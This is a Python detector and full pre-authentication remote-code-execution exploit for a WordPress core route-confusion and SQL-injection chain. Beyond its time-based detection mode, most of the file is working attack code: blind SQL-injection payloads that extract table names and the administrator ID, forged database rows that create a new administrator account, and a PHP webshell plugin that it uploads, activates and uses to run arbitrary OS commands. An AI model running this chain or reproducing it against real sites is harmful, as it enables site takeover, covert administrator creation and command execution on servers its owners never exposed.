#!/usr/bin/env python3
"""
wp2shell_check.py — detector & pre-auth RCE PoC for wp2shell
=============================================================
CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
(WP_Query::author__not_in SQL injection) in WordPress core 6.9.0-6.9.4 / 7.0.0-7.0.1.

What it does
------------
**Detect (default):** Confirms the *unauthenticated SQL injection* with a time-based
differential. Reads no data and changes nothing. `--proof` reads two harmless scalars
(@@version, current_user()) as evidence — still read-only.

**Exploit (`-c COMMAND`):** Full pre-auth RCE on stock WordPress — no FILE privilege, no
object cache, no plugins, no misconfigurations required. The chain:
  1. Blind SQLi confirms vulnerability and extracts table prefix / admin ID
  2. UNION row forgery via per_page=-1 split_the_query bypass injects fake posts
  3. oEmbed cache seeding turns read-only SQLi into real DB writes
  4. Changeset elevation + re-entrant parse_request runs in admin context
  5. POST /wp/v2/users creates a new administrator
  6. Login → plugin webshell upload → command execution → self-cleanup

The stock-default RCE mechanism (oEmbed → changeset → re-entry) was researched by
Mustafa Can İPEKÇİ (nukedx), building on the route confusion + SQLi discovered by
Adam Kues (Assetnote / Searchlight Cyber).

Authorized use only
-------------------
Run this against systems you own or are explicitly authorized to test. Remote (non-loopback)
targets require --authorized.

Usage
-----
    python3 wp2shell_check.py http://target[:port]           # detect only
    python3 wp2shell_check.py http://target --proof          # + read @@version as evidence
    python3 wp2shell_check.py http://target -c "id"          # full pre-auth RCE
    python3 wp2shell_check.py -f hosts.txt --authorized --json
    python3 wp2shell_check.py http://127.0.0.1:8093          # local lab (no --authorized needed)

Status values:
  vulnerable        - actively confirmed via the injection (batch confusion, 6.9.0-7.0.1)
  affected_version  - fingerprinted version is in an affected range but the active check did
                      not fire (e.g. 6.8.0-6.8.5 has the SQLi sink but not the 6.9+ confusion
                      delivery; or a WAF/edge blocked the probe). Version-based, not proof.
  not_vulnerable    - active check negative and version outside the affected ranges

Exit codes: 0 = needs attention (vulnerable or affected_version), 1 = not vulnerable, 2 = error.
Follows redirects while preserving the POST body; ignores TLS errors (curl -k).
"""
import argparse
import base64
import concurrent.futures
import hashlib
import html as html_mod
import io
import json
import re
import secrets
import ssl
import statistics
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from collections import Counter
from http.cookiejar import CookieJar

__version__ = "2.0.0"


class _KeepPost(urllib.request.HTTPRedirectHandler):
    """Follow redirects but PRESERVE the POST method and body. urllib's default handler
    downgrades a redirected POST to a bodyless GET (301/302/303), which would silently
    drop the batch payload when a site redirects http->https or to a canonical host and
    produce a false negative. We keep POSTing to the Location instead. Loop protection
    (max_redirections) is still enforced by the parent."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
            hdrs = {k: v for k, v in req.header_items() if k.lower() != "content-length"}
            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
                                          origin_req_host=req.origin_req_host,
                                          unverifiable=True, method="POST")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class Target:
    def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto"):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.sleep = float(sleep)
        self.route = route
        self._proxy = proxy
        self.batch = None        # resolved endpoint URL (canonical, post-redirect)
        self._base = 0.0         # measured baseline round-trip (set by detect(); used by the oracle)
        self._normalized = False # whether the base host/scheme has been canonicalized
        # Ignore TLS verification (self-signed / expired / hostname-mismatch certs are
        # common on test targets). Equivalent to `curl -k`.
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener_handlers = [urllib.request.HTTPSHandler(context=ctx), _KeepPost()]
        if proxy:
            opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            opener_handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
        self.opener = urllib.request.build_opener(*opener_handlers)

    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

    def _normalize_base(self):
        """Follow redirects on the root once and pin the canonical scheme://host, so the
        batch POST goes straight to the final host (http->https, apex->www, etc.) instead
        of relying on a redirect for every probe. Only scheme+host are taken (never a
        redirected path), so REST routes stay correct."""
        if self._normalized:
            return
        self._normalized = True
        try:
            req = urllib.request.Request(self.base + "/", headers={"User-Agent": self.UA})
            with self.opener.open(req, timeout=self.timeout) as r:
                u = urllib.parse.urlparse(r.geturl())
                if u.scheme and u.netloc:
                    canon = "%s://%s" % (u.scheme, u.netloc)
                    if canon != self.base:
                        self.base = canon
                        self.batch = None  # re-resolve endpoint against the canonical host
        except Exception:
            pass

    # -- HTTP ---------------------------------------------------------------
    def _raw(self, url, data=None, headers=None, method=None):
        hdrs = dict(headers or {})
        hdrs.setdefault("User-Agent", self.UA)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.perf_counter()
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                body = r.read()
                return r.status, time.perf_counter() - t0, body, r.geturl()
        except urllib.error.HTTPError as e:
            return e.code, time.perf_counter() - t0, e.read(), getattr(e, "url", url)

    def _endpoints(self):
        if self.route == "wp-json":
            return [self.base + "/wp-json/batch/v1"]
        if self.route == "rest-route":
            return [self.base + "/?rest_route=/batch/v1"]
        # auto: rest_route works without pretty permalinks; wp-json needs them
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    # -- payload ------------------------------------------------------------
    # The injected value breaks out of `post_author NOT IN ( <value> )` and wraps SLEEP
    # in a derived table:  (SELECT 1 FROM (SELECT SLEEP(n))x)  -- so MySQL materializes
    # and evaluates it once, independent of the number of rows the posts query returns.
    # A bare `NOT IN (SELECT SLEEP(n))` / `OR SLEEP(n)` gets optimized away and never
    # executes on some managed WordPress hosts, which reads as a false negative. The
    # nested subquery avoids that.
    @staticmethod
    def _envelope(author_exclude):
        """Nested batch (route confusion) that lands `author_exclude` in WP_Query::author__not_in."""
        enc = urllib.parse.quote(author_exclude, safe="")
        inner = {"requests": [
            {"method": "POST", "path": "///"},                            # misalignment trigger
            {"method": "GET",  "path": "/wp/v2/users?author_exclude=" + enc},
            {"method": "GET",  "path": "/wp/v2/posts"},                   # supplies get_items handler
        ]}
        return {"requests": [
            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
            {"method": "POST", "path": "///", "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},    # self-call onto batch handler
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def probe(self, author_exclude):
        """Send one injection carrying <author_exclude> into author__not_in. Returns (status, elapsed)."""
        self._normalize_base()
        body = json.dumps(self._envelope(author_exclude)).encode()
        headers = {"Content-Type": "application/json"}
        if self.batch is None:
            # resolve which endpoint form the site accepts (a processed batch answers 207/200);
            # pin the post-redirect URL so later probes hit the canonical endpoint directly.
            for ep in self._endpoints():
                st, _, _, final = self._raw(ep, data=body, headers=headers, method="POST")
                if st in (200, 207):
                    self.batch = final
                    break
            if self.batch is None:
                self.batch = self._endpoints()[0]  # fall back; timing still decides
        st, el, _, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
        return st, el

    @staticmethod
    def _sleep_payload(seconds):
        return "0) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % seconds

    # -- detection ----------------------------------------------------------
    def detect(self, rounds=3):
        fast = statistics.median(self.probe(self._sleep_payload(0))[1] for _ in range(rounds))
        slow = statistics.median(self.probe(self._sleep_payload(self.sleep))[1] for _ in range(rounds))
        self._base = fast
        delta = slow - fast
        # vulnerable if the slow path tracks our injected sleep and the fast path did not
        vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
        return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}

    # -- bounded read-only proof -------------------------------------------
    def _oracle(self, cond, unit=0.6):
        payload = "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (cond, unit)
        _, el = self.probe(payload)
        return el > (self._base + unit * 0.6)   # relative to measured baseline (latency-safe)

    def read_scalar(self, expr, maxlen=40, unit=0.6):
        v = "COALESCE((%s),'')" % expr
        lo, hi = 0, maxlen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("CHAR_LENGTH(%s)>=%d" % (v, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        out = ""
        for pos in range(1, lo + 1):
            a, b = 32, 126
            while a < b:
                mid = (a + b + 1) // 2
                if self._oracle("ASCII(SUBSTRING(%s,%d,1))>=%d" % (v, pos, mid), unit):
                    a = mid
                else:
                    b = mid - 1
            out += chr(a)
        return out

    def read_int(self, query, unit=0.6):
        expr = "COALESCE((%s),0)" % query
        lo, hi = 0, 1
        while self._oracle("%s >= %d" % (expr, hi), unit):
            lo, hi = hi, hi * 2
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("%s >= %d" % (expr, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        return lo

    # -- RCE: row forgery + oEmbed → changeset → re-entry → admin creation ----
    # Chain researched by Mustafa Can İPEKÇİ (nukedx),
    # building on the route confusion + SQLi by Adam Kues (Assetnote).

    PRIMER = "http://:"
    EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

    def _rce_send(self, inner_requests, timeout=None):
        payload = {"requests": [
            {"method": "POST", "path": self.PRIMER},
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]}
        ep = self.batch or self._endpoints()[0]
        body = json.dumps(payload).encode()
        hdrs = {"Content-Type": "application/json", "User-Agent": self.UA}
        req = urllib.request.Request(ep, data=body, headers=hdrs, method="POST")
        try:
            with self.opener.open(req, timeout=timeout or self.timeout) as resp:
                return resp.read()
        except urllib.error.HTTPError as e:
            return e.read()

    @staticmethod
    def _hex(value):
        return "0x%s" % value.encode().hex() if value else "''"

    def _post_row(self, post_id, content, title, status, name, parent, post_type):
        h = self._hex
        return ",".join((
            str(post_id), "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            h(content), h(title), "''",
            h(status), h("closed"), h("closed"), "''",
            h(name), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            str(parent), "''", "0",
            h(post_type), "''", "0",
        ))

    def _forge(self, rows, extra_requests=()):
        query = ("1) AND 1=0 UNION ALL SELECT "
                 + " UNION ALL SELECT ".join(rows) + " -- -")
        self._rce_send([
            {"method": "GET", "path": self.PRIMER},
            {"method": "GET", "path": "/wp/v2/widgets?"
             + urllib.parse.urlencode({"author_exclude": query, "per_page": -1,
                                       "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
            *extra_requests,
        ], timeout=60)

    def exploit(self, command):
        """Full pre-auth RCE. Returns (username, password, command_output)."""
        self._normalize_base()

        # 1. published post for oEmbed anchor
        try:
            with self.opener.open(
                urllib.request.Request(
                    self.base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
                    headers={"User-Agent": self.UA}), timeout=15) as resp:
                items = json.loads(resp.read())
        except Exception:
            items = []
        if not items or not items[0].get("link"):
            raise RuntimeError("no published post for oEmbed anchor")

        link = urllib.parse.urlsplit(items[0]["link"])
        token = secrets.token_hex(6)
        embed_urls = [
            urllib.parse.urlunsplit((
                link.scheme, link.netloc, link.path, link.query,
                "%s%d" % (token, i)))
            for i in range(3)]

        # 2. seed 3 oEmbed caches (forged post with [embed] shortcodes → real DB writes)
        sys.stderr.write("[*] seeding oEmbed caches ...\n")
        seed_content = "".join(
            '[embed width="500" height="750"]%s[/embed]' % u for u in embed_urls)
        self._forge([self._post_row(
            0, seed_content, "seed", "publish", "seed", 0, "post")])

        # 3. extract table prefix, admin ID, seeded cache post IDs
        sys.stderr.write("[*] extracting table prefix ...\n")
        posts_table = self.read_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1", 64)
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError("could not resolve posts table (%r)" % posts_table)
        prefix = posts_table[:-5]
        sys.stderr.write("[+] table prefix: %s\n" % (prefix or "(empty)"))

        sys.stderr.write("[*] extracting admin user ID ...\n")
        admin_id = self.read_int(
            "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
            "ON m.user_id=u.ID WHERE m.meta_key=%s "
            "AND INSTR(m.meta_value,%s)>0 "
            "ORDER BY u.ID LIMIT 1" % (
                prefix, prefix,
                self._hex(prefix + "capabilities"),
                self._hex('s:13:"administrator";b:1;')))
        if admin_id < 1:
            raise RuntimeError("could not locate an administrator")
        sys.stderr.write("[+] admin ID: %d\n" % admin_id)

        sys.stderr.write("[*] recovering oEmbed cache post IDs ...\n")
        cache_ids = []
        for u in embed_urls:
            key = hashlib.md5((u + self.EMBED_ATTR).encode()).hexdigest()
            pid = self.read_int(
                "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
                "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
                    posts_table, key.encode().hex()))
            if pid < 1:
                raise RuntimeError("oEmbed cache seeding failed")
            cache_ids.append(pid)
        if len(set(cache_ids)) != 3:
            raise RuntimeError("oEmbed cache IDs not distinct")
        sys.stderr.write("[+] cache IDs: %s\n" % cache_ids)

        # 4. forge changeset elevation + re-entrant parse_request, create admin
        username = "w2s_%s" % token
        password = "W2s!%s" % secrets.token_urlsafe(15)
        email = "%s@wp2shell.local" % username
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner_id = outer + 1, outer + 2

        changeset = json.dumps({
            "nav_menu_item[%d]" % nav_id: {
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0,
                    "position": 0, "type": "custom", "title": "proof",
                    "url": "https://github.com/dinosn/wp2shell-lab",
                    "target": "", "attr_title": "", "description": "proof",
                    "classes": "", "xfn": "", "status": "publish",
                    "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item", "user_id": admin_id,
            }
        }, separators=(",", ":"))

        poisoned = (
            self._post_row(0,
                '[embed width="500" height="750"]%s[/embed]' % embed_urls[1],
                "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future",
                str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft",
                "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish",
                "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish",
                "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse",
                "parse", inner_id, "request"),
            self._post_row(inner_id, "inner", "inner", "draft",
                "inner", cache_ids[2], "post"),
        )
        new_admin = {"username": username, "email": email,
                     "password": password, "roles": ["administrator"]}

        sys.stderr.write("[*] forging changeset + re-entry, creating administrator ...\n")
        self._forge(poisoned, extra_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ])

        # 5. login and deploy self-cleaning webshell plugin
        sys.stderr.write("[+] administrator created: %s:%s  (%s)\n"
                         % (username, password, email))
        sys.stderr.write("[*] logging in, deploying webshell, executing command ...\n")

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sh = [urllib.request.HTTPSHandler(context=ctx),
              urllib.request.HTTPCookieProcessor(CookieJar()), _KeepPost()]
        if self._proxy:
            sh.append(urllib.request.ProxyHandler(
                {"http": self._proxy, "https": self._proxy}))
        else:
            sh.append(urllib.request.ProxyHandler({}))
        session = urllib.request.build_opener(*sh)

        session.open(urllib.request.Request(
            self.base + "/wp-login.php",
            headers={"User-Agent": self.UA}), timeout=15).read()
        session.open(urllib.request.Request(
            self.base + "/wp-login.php",
            data=urllib.parse.urlencode({
                "log": username, "pwd": password, "wp-submit": "Log In",
                "redirect_to": self.base + "/wp-admin/",
                "testcookie": "1"}).encode(),
            headers={"User-Agent": self.UA},
            method="POST"), timeout=30).read()

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/users.php",
                headers={"User-Agent": self.UA}), timeout=30) as resp:
            users_page = resp.read().decode(errors="replace")
        if username not in users_page:
            raise RuntimeError("admin login failed (user not created?)")

        slug = "wp2shell-%s" % secrets.token_hex(6)
        route = secrets.token_hex(12)
        marker = secrets.token_hex(12)
        php = (
            "<?php\n"
            "/* Plugin Name: %s */\n"
            "add_action('rest_api_init', function () {\n"
            "    register_rest_route('wp2shell/v1', '/%s', array(\n"
            "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
            "        'callback' => function ($r) {\n"
            "            ob_start(); passthru(base64_decode($r->get_param('c')).' 2>&1');\n"
            "            $o = ob_get_clean();\n"
            "            require_once ABSPATH.'wp-admin/includes/plugin.php';\n"
            "            deactivate_plugins(plugin_basename(__FILE__), true);\n"
            "            @unlink(__FILE__);\n"
            "            return new WP_REST_Response(array(\n"
            "                'marker' => '%s', 'output' => $o));\n"
            "        },\n"
            "    ));\n"
            "});\n" % (slug, route, marker)).encode()

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("%s/%s.php" % (slug, slug), php)

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/plugin-install.php?tab=upload",
                headers={"User-Agent": self.UA}), timeout=30) as resp:
            page = resp.read().decode(errors="replace")
        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found")

        boundary = "----wp2shell%s" % secrets.token_hex(12)
        body = b"".join((
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wpnonce\"\r\n\r\n%s\r\n" % (boundary, nonce.group(1))).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wp_http_referer\"\r\n\r\n"
             "/wp-admin/plugin-install.php?tab=upload\r\n" % boundary).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"pluginzip\"; filename=\"%s.zip\"\r\n"
             "Content-Type: application/zip\r\n\r\n" % (boundary, slug)).encode(),
            buf.getvalue(),
            ("\r\n--%s--\r\n" % boundary).encode(),
        ))
        with session.open(urllib.request.Request(
                self.base + "/wp-admin/update.php?action=upload-plugin",
                data=body,
                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary,
                         "User-Agent": self.UA},
                method="POST"), timeout=60) as resp:
            install_page = resp.read().decode(errors="replace")

        activate = re.search(
            r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install_page)
        if not activate:
            raise RuntimeError("plugin install/activation link not found")
        session.open(urllib.request.Request(
            urllib.parse.urljoin(self.base + "/wp-admin/",
                                html_mod.unescape(activate.group(1))),
            headers={"User-Agent": self.UA}), timeout=30).read()

        cmd_req = urllib.request.Request(
            self.base + "/?rest_route=/wp2shell/v1/%s" % route,
            data=json.dumps({
                "c": base64.b64encode(command.encode()).decode()}).encode(),
            headers={"Content-Type": "application/json",
                     "User-Agent": self.UA},
            method="POST")
        with self.opener.open(cmd_req, timeout=60) as resp:
            result = json.loads(resp.read())
        if result.get("marker") != marker:
            raise RuntimeError("webshell did not respond correctly")

        return username, password, result["output"]


# -- version fingerprint (best-effort, read-only) --------------------------

# Full chain = batch-route confusion (CVE-2026-63030) + SQLi. Only these ranges are
# actively testable: the confusion is what bypasses input sanitization to reach the sink.
FULL_CHAIN = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1))]
# SQLi sink alone (CVE-2026-60137). The version is affected, but the confusion delivery
# does NOT exist here, so there is no unauth active check on this branch (fixed 6.8.6).
SINK_ONLY = [((6, 8, 0), (6, 8, 5))]


def _ver_tuple(s):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)) if m else None


def fingerprint_version(t):
    for path, pat in (("/", r'content="WordPress\s+([0-9.]+)"'),
                      ("/readme.html", r"Version\s+([0-9.]+)"),
                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)")):
        try:
            _, _, body, _ = t._raw(t.base + path)
            m = re.search(pat, body.decode("utf-8", "replace"))
            if m:
                return m.group(1)
        except Exception:
            pass
    return None


def version_verdict(ver):
    vt = _ver_tuple(ver) if ver else None
    if not vt:
        return "unknown"
    if any(lo <= vt <= hi for lo, hi in FULL_CHAIN):
        return "affected-full-chain"
    if any(lo <= vt <= hi for lo, hi in SINK_ONLY):
        return "affected-sqli-sink-only"
    return "outside-affected-range"


# -- driver ----------------------------------------------------------------
def is_local(base):
    host = urllib.parse.urlparse(base).hostname or ""
    return host in ("localhost", "127.0.0.1", "::1", "[::1]")


def scan_one(url, args):
    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep, route=args.route)
    rec = {"target": url}
    try:
        det = t.detect(rounds=args.rounds)
    except urllib.error.URLError as e:
        rec.update(status="error", error=str(e.reason))
        return rec, 2
    ver = fingerprint_version(t)
    rec["wp_version"] = ver
    rec["version_verdict"] = version_verdict(ver)
    rec["fast_s"] = round(det["fast"], 3)
    rec["slow_s"] = round(det["slow"], 3)
    rec["delta_s"] = round(det["delta"], 3)
    active = det["vulnerable"]
    vv = rec["version_verdict"]
    rec["active_check"] = "fired" if active else "negative"
    if active:
        rec["status"] = "vulnerable"                     # actively confirmed via the injection
    elif vv in ("affected-full-chain", "affected-sqli-sink-only"):
        rec["status"] = "affected_version"               # version affected; active probe didn't confirm
        if vv == "affected-sqli-sink-only":
            rec["note"] = ("version affected by the author__not_in SQLi (CVE-2026-60137, fixed 6.8.6); "
                           "the batch-route confusion that delivers it unauthenticated is 6.9.0+, so "
                           "there is no unauth active check on the 6.8.x branch")
        else:
            rec["note"] = ("version in the full-chain range but the active injection did not fire "
                           "(a WAF/edge may be blocking the batch payload, or the probe was throttled) "
                           "-- treat as affected and patch")
    else:
        rec["status"] = "not_vulnerable"
    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
    if active and args.proof:
        try:
            rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
                            "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
        except Exception as e:
            rec["proof_error"] = str(e)
    return rec, code


def human(rec):
    tag = {"vulnerable": "VULNERABLE", "affected_version": "AFFECTED (version)",
           "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
    line = "[%s] %s" % (tag, rec["target"])
    if rec.get("wp_version"):
        line += "  (WordPress %s, %s)" % (rec["wp_version"], rec["version_verdict"])
    if rec["status"] == "error":
        line += "  -- %s" % rec.get("error")
    elif "delta_s" in rec:
        line += "  [active=%s fast=%.2fs slow=%.2fs delta=%.2fs]" % (
            rec.get("active_check", "?"), rec["fast_s"], rec["slow_s"], rec["delta_s"])
    out = [line]
    if rec.get("note"):
        out.append("        note: " + rec["note"])
    if rec.get("proof"):
        for k, v in rec["proof"].items():
            out.append("        proof  %-16s = %s" % (k, v))
    return "\n".join(out)


def main():
    p = argparse.ArgumentParser(
        description="wp2shell (CVE-2026-63030/60137) detector & pre-auth RCE PoC.")
    p.add_argument("url", nargs="?", help="target base URL, e.g. http://host:8093")
    p.add_argument("-c", "--command", metavar="CMD",
                   help="OS command to execute via pre-auth RCE (requires --authorized for remote)")
    p.add_argument("-f", "--file", help="file with one target URL per line (# comments ok)")
    p.add_argument("--proof", action="store_true",
                   help="read @@version + current_user() as evidence (read-only)")
    p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
    p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
    p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("-t", "--threads", type=int, default=10,
                   help="concurrent workers for -f scans (default 10)")
    p.add_argument("--authorized", action="store_true",
                   help="assert authorization for remote targets")
    p.add_argument("--json", action="store_true", help="emit JSON")
    args = p.parse_args()

    # -- RCE mode (-c COMMAND) ------------------------------------------------
    if args.command:
        if not args.url:
            p.error("-c requires a target URL")
        url = args.url if "://" in args.url else "http://" + args.url
        if not is_local(url) and not args.authorized:
            p.error("-c on remote targets requires --authorized")
        t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
                   sleep=args.sleep, route=args.route)
        try:
            det = t.detect(rounds=args.rounds)
        except urllib.error.URLError as e:
            print("[-] %s" % e.reason); return 2
        if not det["vulnerable"]:
            print("[-] not vulnerable"); return 1
        print("[+] vulnerable (blind SQLi: %.3fs / %.3fs)" % (det["fast"], det["slow"]))
        try:
            user, pw, output = t.exploit(args.command)
        except (RuntimeError, urllib.error.URLError) as e:
            print("[-] exploit failed: %s" % e); return 2
        print("[+] RCE output:\n")
        print(output, end="")
        return 0

    # -- detection mode (default) ---------------------------------------------
    targets = []
    if args.file:
        with open(args.file) as fh:
            targets = [ln.strip() for ln in fh
                       if ln.strip() and not ln.strip().startswith("#")]
    if args.url:
        targets.insert(0, args.url)
    if not targets:
        p.error("provide a target URL or -f hosts.txt")

    remote = [u for u in targets if not is_local(u)]
    if remote and not args.authorized:
        sys.stderr.write(
            "refusing remote targets without --authorized.\n"
            "Only test assets you own or are explicitly authorized to test.\n"
            "Affected remote targets: %s\n" % ", ".join(remote))
        return 2

    def prep(u):
        return u if "://" in u else "http://" + u

    def work(idx, u):
        try:
            rec, _ = scan_one(prep(u), args)
        except Exception as e:                       # one bad host must never kill the run
            rec = {"target": prep(u), "status": "error", "error": repr(e)}
        return idx, rec

    total = len(targets)
    workers = max(1, min(args.threads, total))
    results = [None] * total
    lock = threading.Lock()
    done = [0]

    def emit(idx, rec):
        results[idx] = rec
        with lock:
            done[0] += 1
            if args.json:
                sys.stderr.write("\r  scanned %d/%d" % (done[0], total)); sys.stderr.flush()
            else:
                pfx = "[%d/%d] " % (done[0], total) if total > 1 else ""
                print(pfx + human(rec), flush=True)

    if workers == 1:
        for i, u in enumerate(targets):
            emit(*work(i, u))
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(work, i, u) for i, u in enumerate(targets)]
            try:
                for fut in concurrent.futures.as_completed(futs):
                    emit(*fut.result())
            except KeyboardInterrupt:
                sys.stderr.write("\ninterrupted -- cancelling pending scans\n")
                ex.shutdown(wait=False, cancel_futures=True)

    results = [r for r in results if r is not None]
    if args.json:
        sys.stderr.write("\n")
        print(json.dumps(results, indent=2))

    c = Counter(r["status"] for r in results)
    sys.stderr.write("\nsummary: %d scanned | vulnerable=%d  affected_version=%d  "
                     "not_vulnerable=%d  error=%d\n" % (
                         len(results), c.get("vulnerable", 0), c.get("affected_version", 0),
                         c.get("not_vulnerable", 0), c.get("error", 0)))

    # exit 0 if any host needs attention (actively vulnerable or affected version),
    # else 1 (all clear), else 2 (all errored)
    if any(r["status"] in ("vulnerable", "affected_version") for r in results):
        return 0
    if results and all(r["status"] == "error" for r in results):
        return 2
    return 1


if __name__ == "__main__":
    sys.exit(main())
